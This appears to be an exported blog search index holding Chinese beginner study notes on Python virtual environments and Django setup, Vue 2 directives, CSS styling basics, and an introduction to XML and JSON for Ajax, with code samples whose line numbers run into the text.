TestDemo # 虚拟环境的名字 激活虚拟环境 进入TestDemo下的Scripts目录，打开cmd执行 1activate 安装依赖库 1234567# pip install &quot;pillow &gt; 4.3&quot;# pip install &quot;pillow==5&quot;pip install &quot;Django==2.0.6&quot; 安装指定版本 # pip install django 安装最新版本 关闭虚拟环境 1deactivate 注意：Python3自带了虚拟环境工具pyvenv，类库中增加了一个venv模块： 1python -m venv TestDemo 2、虚拟环境管理工具 virtualenvwrapper 是一个基于virtualenv之上的工具，它将所有的虚拟环境统一管理。 123456789101112131415pip install virtualenv # 安装virtualenv包pip install virtualenvwrapper-win # 安装管理虚拟环境的包# 安装之后配置环境变量WORKON_HOME=E:\\Python Web\\Python-Web-Lee\\05 Django\\Django-Virtual-Env# 此目录用来统一存放所有创建的虚拟环境 默认目录是：c:\\users\\用户名\\envs# 创建虚拟环境mkvirtualenv Test # 在WORKON_HOME目录下创建名为Test的虚拟环境，且在创建后自己激活虚拟环境# 后续如果要使用虚拟环境workon Test#退出虚拟环境deactivate 总结： 12345678910# 创建Django项目的完整流程：# 1、打开Pycharm，新建Django的项目，注意选择项目的解释器--虚拟环境的解释器# 2、创建app -- 打开Pycharm左下角的terminal ，执行python manager.py startapp app名# 3、打开app的views.py文件 定义视图函数# 4、每个视图函数必须返回一个响应# （1）通过HttpResponse(&quot;xxx&quot;)# （2）通过render(request,&quot;xxx.html&quot;) 如果使用模板文件，需要在项目根目录的templates目录中添加模板文件# 5、每个视图函数都应该有一个访问路径，在urls.py文件中定义path# 6、启动项目服务器 -- 通过pycharm的菜单项中的run即# 7、打开浏览器，输入url即可访问","categories":[],"tags":[]},{"title":"","slug":"day2","date":"2024-10-24T11:20:58.335Z","updated":"2024-10-07T05:21:32.106Z","comments":true,"path":"2024/10/24/day2/","permalink":"http://example.com/2024/10/24/day2/","excerpt":"","text":"vue-day11. vue简介官网: https://cn.vuejs.org/ 渐进式JavaScript框架 123456789101112# 渐进式 1. 易用 html css javascript 2. 灵活 开发前端页面十分灵活 3. 高效 开发效率高 # Vue对于后端开发人员来说: vue是一个js框架, 让我们通过操作很少的dom元素,甚至不需要操作dom元素来很容易的就可以完成视图与数据的绑定 双向绑定 MVVM 注意: 日后在使用vue的时候一般不引入jQuery # Vue作者 尤雨溪 2. vue的入门2.1 vue的下载12345&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;!-- 生产环境版本，优化了尺寸和速度 --&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue&quot;&gt;&lt;/script&gt; 2.2 vue的第一个实例1234567891011121314151617181920212223&lt;div id=&quot;app&quot;&gt; &#123;&#123; message &#125;&#125; &lt;h2&gt;&#123;&#123;username&#125;&#125;&lt;/h2&gt;&lt;/div&gt;&lt;!-- vue js的引入 --&gt;&lt;!--&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;&gt;&lt;/script&gt;--&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; // 创建第一个vue的实例 new Vue(&#123; el: &quot;#app&quot;, // 用来定义vue的作用范围 element对象 // 用来给vue实例定义一些相关的数据 vue默认属性 data: &#123; // data中变量的名字可以随便定义 message: &quot;Hello Vue!!&quot;, username: &quot;百知教育&quot;, &#125;, &#125;)&lt;/script&gt; 12345# 总结 1. vue实例(对象)中el: 代表vue的作用范围,定义后可以在范围内使用vue的语法 2. vue实例中data: 用来给vue绑定一些相关的数据, 绑定的数据可以通过&#123;&#123;变量名&#125;&#125;在vue的作用范围内进行访问 3. 在使用插值表达式&#123;&#123;&#125;&#125;取值时可以进行简单的运算, 可以书写表达式,运算符,调用相关方法 4. el属性可以使用任意类型的选择器,但是在使用时只推荐使用id选择器 3. v-text与v-html3.1 v-text v-text: 用来获取data中定义的数据并且将数据以文本的形式渲染到指定标签内部 1234567891011121314151617&lt;div id=&quot;app&quot;&gt; &lt;span&gt;&#123;&#123;message&#125;&#125;, 大家是非常优秀的大学生&lt;/span&gt; &lt;hr&gt; &lt;!-- v-text=&quot;data中定义好的变量&quot; 会覆盖标签中原有的值 --&gt; &lt;span v-text=&quot;message&quot;&gt;大家是非常优秀的大学生&lt;/span&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; message: &quot;百知教育欢迎大家&quot;, &#125;, &#125;)&lt;/script&gt; 123# v-text与&#123;&#123;&#125;&#125;插值表达式都是用来获取data中的数据,二者区别在于 1. 使用v-text会覆盖标签内部原有的值,插值表达式不会覆盖,会与原有的值进行拼接 2. 在网络较慢的情况下,v-text会避免出现插值闪烁的情况 3.3 v-html 用来获取data数据中的html标签,并且将a标签作为链接显示 123456789101112131415161718&lt;div id=&quot;app&quot;&gt; &#123;&#123;msg&#125;&#125; &lt;hr&gt; &lt;span v-html=&quot;msg&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; msg: &quot;&lt;a href=\\&quot;\\&quot;&gt;百知教育&lt;/a&gt;&quot; &#125;, &#125;)&lt;/script&gt; 4. Vue的事件绑定4.1 事件绑定的基本语法12345678910111213141516171819202122232425262728293031323334&lt;div id=&quot;app&quot;&gt; &lt;!-- 1. 页面提供点击按钮 2. 给按钮绑定一个事件 onclick 3. 在单击事件触发的方法中来修改年龄的值 并渲染到页面上 --&gt; &lt;h3&gt;年龄: &#123;&#123;age&#125;&#125;&lt;/h3&gt; &lt;!-- v-on:事件名=&quot;你在methods中定义好的方法的名称&quot; --&gt; &lt;input type=&quot;button&quot; value=&quot;点我长大&quot; v-on:click=&quot;add_age&quot;&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; age: 18, &#125;, // 用来定义vue的方法 methods: &#123; // 年龄增长的方法 add_age: function () &#123; // alert(&quot;方法触发了&quot;) // 获取data中定义的age并增长 // 在事件方法中可以通过 this 来获取当前vue实例所包含的属性 console.log(this.age) this.age++; console.log(this.age, &quot;1111&quot;) &#125;, &#125;, &#125;)&lt;/script&gt; 12345# 总结 1. 在vue中事件的绑定是通过v-on指令来完成的 v-on:事件名=&quot;定义好的方法&quot; 2. v-on:事件名=&quot;函数名&quot; 赋值语句就是当前事件要触发的方法 3. 在vue中事件对应的方发统一定义在vue实例中methods属性中 4. 在vue定义的事件中,this代表当前vue实例,你可以通过this获取到vue实例的相关的数据 4.2 事件简化写法12345678910111213141516171819202122232425262728&lt;div id=&quot;app&quot;&gt; &lt;h3&gt;年龄: &#123;&#123;age&#125;&#125;&lt;/h3&gt; &lt;input type=&quot;button&quot; v-on:click=&quot;change_age&quot; value=&quot;点击v-on绑定的事件&quot;&gt; &lt;!-- 事件的简化写法 @事件名 两者作用完全一致 --&gt; &lt;input type=&quot;button&quot; value=&quot;简化写法&quot; @click=&quot;edit_age&quot;&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; age: 23, &#125;, methods: &#123; change_age: function () &#123; this.age--; &#125;, edit_age: function () &#123; this.age++; &#125; &#125;, &#125;)&lt;/script&gt; 4.3 事件函数的简化1234567891011121314151617181920212223242526272829&lt;div id=&quot;app&quot;&gt; &lt;h3&gt;数字: &#123;&#123; num &#125;&#125;&lt;/h3&gt; &lt;input type=&quot;button&quot; @click=&quot;change_num&quot; value=&quot;点我&quot;&gt; &lt;input type=&quot;button&quot; @click=&quot;low_num&quot; value=&quot;戳你&quot;&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; num: 20, &#125;, methods: &#123; // 标准写法 change_num: function () &#123; this.num += 2; &#125;, // 简化写法 low_num() &#123; this.num--; &#125;, &#125;, &#125;)&lt;/script&gt; 4.4 参数的传递12345678910111213141516171819202122232425262728&lt;div id=&quot;app&quot;&gt; &lt;h3&gt;数字: &#123;&#123;number&#125;&#125;&lt;/h3&gt; &lt;input type=&quot;button&quot; value=&quot;点我&quot; @click=&quot;change_number(78, &#x27;小黑&#x27;, event)&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;点我2&quot; @click=&quot;change_number2()&quot;&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; number: 34, &#125;, methods: &#123; change_number(num, name, event) &#123; console.log(name); this.number = num; console.log(event) &#125;, change_number2() &#123; console.log(event) &#125;, &#125;, &#125;)&lt;/script&gt; 5. v-show v-if v-bind5.1 v-show v-show: 用来控制页面中的某个标签是否展示 1234567891011121314151617181920212223242526272829303132333435363738&lt;div id=&quot;app&quot;&gt; &lt;!-- 用来控制标签是否展示 true false --&gt; &lt;h3 v-show=&quot;true&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h3&gt; &lt;hr&gt; &lt;h3 v-show=&quot;isShow&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h3&gt; &lt;hr&gt; &lt;input v-show=&quot;isShow&quot; value=&quot;点击控制是否展示&quot; @click=&quot;showMsg&quot;&gt; &lt;hr&gt; &lt;span v-show=&quot;count&gt;=30&quot;&gt;百知教育&lt;/span&gt; &lt;input type=&quot;button&quot; value=&quot;点我&quot; @click=&quot;change_count&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;点我&quot; @click=&quot;add_count&quot;&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; message: &quot;上课一定好好听~~&quot;, isShow: true, count: 30, &#125;, methods: &#123; showMsg() &#123; this.isShow = !this.isShow; &#125;, change_count() &#123; this.count--; &#125;, add_count()&#123; this.count++; &#125;, &#125;, &#125;)&lt;/script&gt; 5.2 v-if v-if:用来控制页面元素的条件 v-else必须跟在v-if元素的后面,否则无法识别 123456789101112131415&lt;div id=&quot;app&quot;&gt; &lt;h3 v-if=&quot;true&quot; id=&quot;a1&quot;&gt;百知教育&lt;/h3&gt; &lt;h3 v-else id=&quot;a2&quot;&gt;欢迎你&lt;/h3&gt; &lt;h3 v-else-if=&quot;false&quot;&gt;加入&lt;/h3&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, &#125;)&lt;/script&gt; 5.3 v-bind v-bind: 用来绑定标签的属性从而可以通过vue的实例来动态的修改标签的属性 123456789101112131415161718192021222324252627282930313233343536&lt;div id=&quot;app&quot;&gt; &lt;!-- &lt;img class=&quot;aa&quot; title=&quot;帅气的二哈&quot;--&gt; &lt;!-- src=&quot;https://dss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=3469716026,2816395410&amp;fm=26&amp;gp=0.jpg&quot;&gt;--&gt; &lt;!-- 可以通过v-bind绑定data中定义的属性 v-bind绑定的属性的值一定要在data提前定义好 --&gt; &lt;!-- &lt;img v-bind:src=&quot;src&quot; v-bind:title=&quot;title&quot; v-bind:class=&quot;&#123;aa: showCss&#125;&quot;&gt;--&gt; &lt;!-- v-bind简化写法 --&gt; &lt;img :src=&quot;src&quot; :title=&quot;title&quot; :class=&quot;&#123;aa: showCss&#125;&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;改变图片的样式&quot; @click=&quot;addCss&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;切换图片&quot; @click=&quot;changeImg&quot;&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; title: &quot;帅气的二哈&quot;, showCss: false, src: &quot;https://dss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=3469716026,2816395410&amp;fm=26&amp;gp=0.jpg&quot; &#125;, methods: &#123; // 改变图片的样式 addCss() &#123; this.showCss = !this.showCss; &#125;, changeImg() &#123; this.src = &quot;https://dss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=2481540226,557581684&amp;fm=115&amp;gp=0.jpg&quot; &#125;, &#125;, &#125;)&lt;/script&gt; 123# 总结 1. 可以通过v-bind来为标签动态的绑定属性,绑定后可以通过vue实例来控制标签的属性 2. v-bind:属性 可以简写为 :属性 两者只是写法不同 其余一致 6. v-for v-for: 用来进行循环遍历 1234567891011121314151617181920212223242526272829303132333435&lt;div id=&quot;app&quot;&gt; &lt;h3&gt;&#123;&#123;user.name&#125;&#125;==&#123;&#123;user.age&#125;&#125;==&#123;&#123;user.pwd&#125;&#125;&lt;/h3&gt; &lt;!-- 遍历对象 --&gt; &lt;span v-for=&quot;(value, key, index) in user&quot;&gt; &#123;&#123;key&#125;&#125;: &#123;&#123;value&#125;&#125;===&#123;&#123;index&#125;&#125; &lt;/span&gt; &lt;!-- 遍历书序 --&gt; &lt;ul v-for=&quot;(city, index) in arr&quot;&gt; &lt;li&gt;&#123;&#123;index + 1&#125;&#125;: &#123;&#123;city&#125;&#125;&lt;/li&gt; &lt;/ul&gt; &lt;hr&gt; &lt;!-- 遍历数组中的对象 --&gt; &lt;ul v-for=&quot;(value, index) in users&quot; :key=&quot;index&quot;&gt; &lt;li&gt;&#123;&#123;index+1&#125;&#125;: &#123;&#123;value.name&#125;&#125;==&#123;&#123;value.age&#125;&#125;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; user: &#123;name: &quot;小黑&quot;, age: 23, pwd: &quot;123456&quot;&#125;, arr: [&quot;四川&quot;, &quot;北京&quot;, &quot;山西&quot;], users: [&#123;name: &quot;小黑&quot;, age: 13, pwd: &quot;123456&quot;&#125;, &#123;name: &quot;小张&quot;, age: 23, pwd: &quot;123456&quot;&#125;, &#123;name: &quot;小波&quot;, age: 63, pwd: &quot;123456&quot;&#125;, ] &#125;, &#125;)&lt;/script&gt; 12# 注意: 在使用v-for的时候一定注意加上:key 用来给vue内部提供重用和排序的唯一key 7. v-model双向绑定7.1 基本实例 v-model: 用来绑定标签元素值与vue实例中data的数据保持一致,从而可以实现数据的双向绑定 123456789101112131415161718192021222324&lt;div id=&quot;app&quot;&gt; &lt;!-- v-model只能应用于表单控件 --&gt;&lt;!-- &lt;input type=&quot;text&quot; @click=&quot;changeValue&quot; value=&quot;改变value&quot;&gt;--&gt; &lt;input type=&quot;text&quot; v-model=&quot;message&quot;&gt; &lt;p&gt;&#123;&#123;message&#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; message: &quot;&quot;, &#125;, methods: &#123; changeValue() &#123; this.message = &quot;百知教育&quot; &#125;, &#125; &#125;)&lt;/script&gt; 12345678910# 总结: 1. 使用v-model可以实现数据与页面的双向绑定 2. 所谓双向绑定: 表单中的数据发生变化导致vue实例中的data数据发生了变化 vue实例中data数据的变化也会影响到页面中数据的显示# MVVM架构 双向绑定机制 model: 数据 vue绑定的数据 VM: viewmodel 监听器 View: 页面 页面所展示的数据 7.2 留言板1w 作业1231. 完成课堂所有案例至少一遍,掌握vue的基本指令2. 完成留言板的开发 展示留言 添加留言 删除留言 留言总数量 删除所有留言 留言数量为空就,删除所有按钮不显示","categories":[],"tags":[]},{"title":"","slug":"CSS","date":"2024-10-24T11:20:58.331Z","updated":"2024-10-07T05:20:57.306Z","comments":true,"path":"2024/10/24/CSS/","permalink":"http://example.com/2024/10/24/CSS/","excerpt":"","text":"CSS样式表一、概述1、CSS是什么 ？层叠样式表，定制html元素的显示样式，美化页面，对于前端页面的搭建十分重要 2、为什么要使用CSS（1）CSS 指层叠样式表 (Cascading Style Sheets)（2）样式定义如何显示 HTML 元素（3）样式通常存储在样式表中（4）把样式添加到 HTML 中，是为了解决内容与表现分离的问题（5）外部样式表可以极大提高工作效率（6）外部样式表通常存储在 CSS 文件中（7）多个样式定义可层叠为一个 HTML 标签原本被设计为用于定义文档内容。通过使用 &lt;h1&gt;、&lt;p&gt;、&lt;table&gt; 这样的标签，HTML 的初衷是表达“这是标题”、“这是段落”、“这是表格”之类的信息。同时文档布局由浏览器来完成，而不使用任何的格式化标签。 3、学习目标熟悉，熟练使用常用的css样式属性，具备基本的页面美化能力。 二、初识CSS1、第一个CSS样式1234567891011121314&lt;head&gt; &lt;title&gt;CSS样式表&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; p&#123; color: white; /* 字体颜色 */ font-size: 25px; /* 字体大小 */ background-color: gray; /* 背景颜色 */ width: 650px; /* 宽度 */ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;才能的火花，常常在勤奋的磨石上迸发。&lt;/p&gt;&lt;/body&gt; 2、如何插入样式表当读到一个样式表时，浏览器会根据它来格式化 HTML 文档。在HTML文档中插入样式表的方法有三种： 外部样式表 1&lt;link href=&quot;css/index.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt; 内部样式表（位于 &lt;head&gt; 标签内部） 123&lt;style type=&quot;text/css&quot;&gt; &lt;/style&gt; 内联样式（在 HTML 元素内部） 123&lt;p style=&quot;color: white;&quot;&gt; 学习HTML好简单&lt;/p&gt; 样式表的优先级： 内联 &gt; 内部 &gt; 外部 &gt; 缺省 3、基本语法CSS 语法由三部分构成：选择器、属性和值： 1body&#123; background-color:red; &#125; 注意：多个样式之间用分号；隔开。 三、选择器种类1、元素选择器1p&#123; color:white; background-color:gray;&#125; 补充： div和span元素 div 是一个块级元素 : &lt;div&gt; 标签可以把文档分割为独立的、不同的部分。它可以用作严格的组织工具，并且不使用任何格式与其关联。 123456&lt;div&gt; 才能的火花，常常在勤奋的磨石上迸发。 &lt;/div&gt;&lt;div&gt; 只要愿意学习，就一定能够学会。&lt;/div&gt; span 标签被用来组合文档中的行内元素。 123&lt;div&gt; 只要愿意&lt;span style=&quot;color: red;font-weight: bold;&quot;&gt;学习&lt;/span&gt;，就一定能够学会。&lt;/div&gt; 2、类选择器 类选择器可以为标有特定 class 的 HTML 元素指定特定的样式。可以用于区分不同的HTML元素。 类选择器以 “.” 来定义 HTML： 123456789&lt;div class=&quot;div_1&quot;&gt; 才能的火花，常常在勤奋的磨石上迸发。 &lt;/div&gt;&lt;div class=&quot;div_2&quot;&gt; 只要愿意学习，就一定能够学会。&lt;/div&gt;&lt;div class=&quot;div_3 div_4&quot;&gt; &lt;!-- 两个值 --&gt; 学的越多，自身的价值就越高。&lt;/div&gt; CSS: 12345&lt;style type=&quot;text/css&quot;&gt; .div_1 &#123;color: red;&#125; .div_2 &#123;color: blue;&#125; .div_3 &#123;color: green;&#125;&lt;/style&gt; 3、id选择器id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。 id 选择器以 “#” 来定义。 HTML： 123456&lt;div id=&quot;div_1&quot;&gt; 才能的火花，常常在勤奋的磨石上迸发。 &lt;/div&gt;&lt;div id=&quot;div_2&quot;&gt; 只要愿意学习，就一定能够学会。&lt;/div&gt; CSS： 1234&lt;style type=&quot;text/css&quot;&gt; #div_1 &#123; color: red; &#125; #div_2 &#123; color: blue; &#125;&lt;/style&gt; id选择器与类选择器的区别： 4、派生选择器派生选择器允许你根据文档的上下文关系来确定某个标签的样式。比如你希望div下的p标签的字体为蓝色： HTML： 123456&lt;div&gt; &lt;p&gt;才能的火花，常常在勤奋的磨石上迸发。&lt;/p&gt; &lt;/div&gt;&lt;p&gt; 只要愿意学习，就一定能够学会。&lt;/p&gt; CSS： 1div p&#123; color: blue; &#125; 后代选择器-子代选择器 5、选择器继承根据 CSS，子元素从父元素继承属性： HTML： 1234&lt;div&gt; &lt;p&gt;才能的火花，常常在勤奋的磨石上迸发。&lt;/p&gt; &lt;b&gt;只要愿意学习，就一定能够学会。&lt;/b&gt;&lt;/div&gt; CSS： 1div &#123; color: blue;&#125; 6、选择器联合使用同时对多个元素设置同一个样式： 123h1,h2,h3,h4,h5,h6 &#123; color: green; &#125; div.div_1 div标签且类属性为div_1 7、伪类选择器1234567891011121314151617181920/*未访问状态的样式*/ span:link&#123; color: chartreuse; &#125; /*访问结束之后的样式*/ span:visited&#123; color: brown; &#125; /*鼠标悬浮在上面的时候*/ span:hover&#123; color: blue; &#125; /*鼠标点击时的样式*/ span:active&#123; color: aqua; &#125; /*输入框(文本类型的输入框)被聚焦的时候的样式*/ input:focus&#123; background-color: gray; &#125; 四、背景样式1、背景颜色可以使用 background-color 属性为元素设置背景色。 HTML： 123&lt;div&gt; 才能的火花，常常在勤奋的磨石上迸发&lt;/div&gt; CSS： 1div&#123;background-color: gray; color: white;&#125; 2、背景图像2.1 设置背景图像要把图像放入背景，需要使用 background-image 属性。 1body&#123; background-image: url(&#x27;lyf.jpg&#x27;) &#125; 2.2 背景重复background-repeat 属性设置是否及如何重复背景图像。 repeat：重复 no-repeat：不重复 repeat-x：水平方向重复 repeat-y：垂直方向重复 1div&#123; background-image: url(&#x27;lyf.jpg&#x27;); background-repeat: no-repeat; &#125; 2.3 背景定位以利用 background-position 属性改变图像在背景中的位置。 top left top center top center center left center center center right bottom left bottom center bottom right 123456789div&#123; background-image: url(&#x27;ym.jpg&#x27;); background-repeat: no-repeat; background-position: center; height: 600px; width: 600px; background-color: lightgray;&#125; 也可以使用百分比来设置图像的位置： 1background-position: 0% 10%; 或者使用像素值来设置： 1background-position: 50px 50px; 2.4 防止背景图像随着页面滚动1background-attachment: fixed; 五、文本样式CSS 文本属性可定义文本的外观。 通过文本属性，可以改变文本的颜色、字符间距，对齐文 本，装饰文本，对文本进行缩进，等等。 1、文字颜色使用属性color来指定文字颜色，其属性取值是CSS颜色。 CSS颜色表（RBG分别代表红绿蓝） 表示形式表示形式 说明 举例 颜色名称 通过英文单词指定颜色 red、green、blue HEX 通过#RRGGBB或者#RGB的形式用十六进制表示颜色 ff0000（同#f00）、#00ff00（同#0f0）、#0000ff（同#00f） RGB 通过rgb(r,g,b)的形式用三个不大于255的数字表示颜色 rgb(255,0,0),rgb(0,255,0),rgb(0,0,255) RGBA RGB形式的扩展，第四个数字取值范围0~1表示透明度，0表示完全透明 rgba(0,0,0,0.6)表示半透明黑色 2、文本缩进CSS 提供了 text-indent 属性，该属性可以方便地实现文本缩进。 缩进可以使用下面三种值： em 长度单位，一般而言 1em &#x3D; 16px px 像素 % 百分比 1div&#123; text-indent: 5em; background-color: lightgray;&#125; 3、水平对齐text-align 是一个基本的属性，它会影响一个元素中的文本行互相之间的对齐方式。 left 左对齐 center 居中 right 右对齐 HTML： 12345&lt;ol&gt; &lt;li class=&quot;li_1&quot;&gt;才能的火花，常常在勤奋的磨石上迸发&lt;/li&gt; &lt;li class=&quot;li_2&quot;&gt;才能的火花，常常在勤奋的磨石上迸发&lt;/li&gt; &lt;li class=&quot;li_3&quot;&gt;才能的火花，常常在勤奋的磨石上迸发&lt;/li&gt;&lt;/ol&gt; CSS： 123li.li_1 &#123; text-align: left; &#125;li.li_2 &#123; text-align: center; &#125;li.li_3 &#123; text-align: right ; &#125; 4、文本装饰text-decoration 属性规定添加到文本的修饰，如加下划线、上划线、删除线等。 none 无装饰 underline 下划线 overline 上划线 line-through 删除线 去除链接中的下划线和颜色： HTML： 1&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度一下，你就知道&lt;/a&gt; CSS： 1a &#123; text-decoration: none; color: black;&#125; 添加下划线、删除线、上划线： HTML： 12345&lt;p&gt; &lt;span class=&quot;s1&quot;&gt;才能的火花，常常在勤奋的磨石上迸发&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;才能的火花，常常在勤奋的磨石上迸发&lt;/span&gt; &lt;span class=&quot;s3&quot;&gt;才能的火花，常常在勤奋的磨石上迸发&lt;/span&gt;&lt;/p&gt; CSS： 123p .s1&#123; text-decoration: underline; &#125;p .s2&#123; text-decoration: line-through; &#125;p .s3&#123; text-decoration: overline; &#125; 5、行间距12345&lt;p&gt; 佛说， 前世五百年的回眸，才换得今生的擦肩而过，那么今生，我又要付出多少期盼，才能换得与你的再一次邂逅？&lt;br&gt; 光阴辗转，兜兜转转，却走不出与你遇见的千回百转，将一笺心语，绽放于相思的轮回里，任花开花落，等你，在红尘深处。&lt;br&gt; 心事如莲，有谁能懂？独处一隅，饮尽孤独，只为在最美的年华里，遇见懂得的那个人，即便，这一场等待，注定是一场关于缘分的修行。&lt;/p&gt; 1p&#123;line-height: 130px;&#125; 六、字体样式1、指定字体指定字体: font-family 1p &#123;font-family: sans-serif;&#125; 2、字体尺寸font-size设置字体的尺寸： 1p&#123; font-size: 100px; &#125; 3、字体粗细font-weight设置字体的粗细。 normal 默认值。定义标准的字符。 bold 定义粗体字符。 bolder 定义更粗的字符。 lighter 定义更细的字符。 100-900 定义由粗到细的字符。400 等同于 normal，而 700 等同于 bold。 1p&#123; font-weight: 700; &#125; 4、字体样式简写1p&#123; font: bolder 50px sans-serif; &#125; 七、框模型（盒子模型）1、概述CSS 框模型 (Box Model) 规定了元素框处理元素内容、内边距、边框 和 外边距 的方式。 元素框的最内部分是实际的内容，直接包围内容的是内边距。 内边距的边缘是边框。 边框以外是外边距。 2、内边距元素的内边距在边框和内容区之间。控制该区域最简单的属性是 padding 属性。 2.1 padding属性1p&#123;padding:30px;width: 200px;height: 200px;background-color: lightgray;&#125; 可以按照上、右、下、左的顺序分别设置各边的内边距，各边均可以使用不同的单位或百分比值： 1p&#123;padding:30px 0px 60px 0px;&#125; 2.2 单边内边距 padding-top padding-right padding-bottom padding-left 3、边框元素的边框 (border) 是围绕元素内容和内边距的一条或多条线。 3.1 边框样式 dotted 点状边框 dashed 虚线 double 双线 solid 实线 123456p&#123; width: 200px; height: 200px; border-style: dotted dashed double solid;&#125; 也可以设置单边框样式： border-top-style border-right-style border-bottom-style border-left-style 3.2 边框宽度可以通过 border-width 属性为边框指定宽度。 1234567p&#123; width: 200px; height: 200px; border-style: dotted dashed double solid; border-width: 5px;&#125; 3.3 边框颜色12345678p&#123; width: 200px; height: 200px; border-style: dotted dashed double solid; border-width: 5px; border-color: red; /* 设置边框颜色 */&#125; 3.4 边框简写123456p&#123; width: 200px; height: 200px; border: solid red 5px;&#125; 4、外边距围绕在元素边框的空白区域是外边距。设置外边距会在元素外创建额外的“空白”。 设置外边距的最简单的方法就是使用 margin 属性，这个属性接受任何长度单位、百分数值甚至负值。 4.1 margin 属性12345&lt;div&gt; &lt;p&gt; 佛说， 前世五百年的回眸，才换得今生的擦肩而过，那么今生，我又要付出多少期盼，才能换得与你的再一次邂逅？ &lt;/p&gt;&lt;/div&gt; 1234&lt;style type=&quot;text/css&quot;&gt; div&#123;width: 800px;height: 300px;background-color: lightgray;margin:0 auto;&#125; p&#123; width: 500px; height: 200px; background-color: lightcoral; margin:30px 0 0 50px;&#125;&lt;/style&gt; 4.2 单边外边距属性 margin-top margin-right margin-bottom margin-left 八、CSS定位1、定位概述2、相对定位12345678div&#123; position: relative; # 相对于自己原来的位置向下偏移30px top：30px; # 相对于自己原来的位置向左偏移30px right：30px; left:30%;&#125; 3、绝对定位123456div&#123; # 让div处于父标签的距离离顶部30px的位置处（前提父标签有position属性，如果没有定位置窗口上） position:absolute; top:30px; &#125; 4、固定定位123456div a&#123; # 使a标签始终固定在距离窗口顶部50%的位置，距离窗口右侧50%的位置 position: fixed; top: 50%; right: 50%; &#125; 5、浮动","categories":[],"tags":[]},{"title":"","slug":"Ajax02","date":"2024-10-24T11:20:58.329Z","updated":"2024-10-07T05:20:57.745Z","comments":true,"path":"2024/10/24/Ajax02/","permalink":"http://example.com/2024/10/24/Ajax02/","excerpt":"","text":"Ajax-JSON二、数据交换格式1、XML1.1 XML简介 XML即可扩展标记语言(extensible Markup Language)。标记是指计算机（浏览器）所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种数据信息 。 XML是一种标记语言，类似HTML XML的设计宗旨是传输数据，而非显示数据 XML只是简单地描述信息,并以独立于平台的格式进行分发。 由于不需要使用任何一种特定的语言,因此 XML 与某一平台无关。 1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; //指明了XML的版本号和编码方式&lt;Employees&gt; &lt;Employee&gt; &lt;Name&gt;Bob Smith&lt;/Name&gt; &lt;PhoneNumber&gt;408-555-1000&lt;/PhoneNumber&gt; &lt;/Employee&gt; &lt;Employee&gt; &lt;Name&gt;Sally Jones&lt;/Name&gt; &lt;PhoneNumber&gt;415-555-2000&lt;/PhoneNumber&gt; &lt;/Employee&gt; &lt;/Employees&gt; XML设计用来传送及携带数据信息，不用来表现或展示数据，HTML语言则用来表现数据，所以XML用途的焦点是它说明数据是什么，以及携带数据信息。 2、JSON2.1 简介 JSON（JavaScript Object Notation）是一种轻量级的数据交换格式。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C、C++、C#、JavaScript、Java、Perl、Python等）。这些特性使JSON成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成(网络传输速度)。 json 数据本质上也是一个字符串 JSON 文本格式在语法上与创建 JavaScript 对象的代码相同。由于这种相似性， 